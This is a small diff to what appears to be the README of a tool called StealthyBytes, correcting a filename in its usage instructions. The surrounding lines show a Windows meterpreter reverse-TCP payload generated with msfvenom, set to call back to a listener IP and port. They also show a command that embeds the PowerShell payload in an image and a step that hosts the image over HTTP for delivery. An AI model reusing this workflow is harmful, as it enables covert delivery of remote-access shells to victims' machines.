@@ -117,7 +117,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.171 lport=1405 -f ps
 Embed `msf.ps1` into an image:
 
 ```bash
-python3 StealthyBytes.py --mode embed --script msf.py --image unarmed.jpg --output armed.png --powershell --base64
+python3 StealthyBytes.py --mode embed --script msf.ps1 --image unarmed.jpg --output armed.png --powershell --base64
 ```
 
 Initiate an `HTTP Server` to host the image (or it can be any online service that provides direct access to image resources):
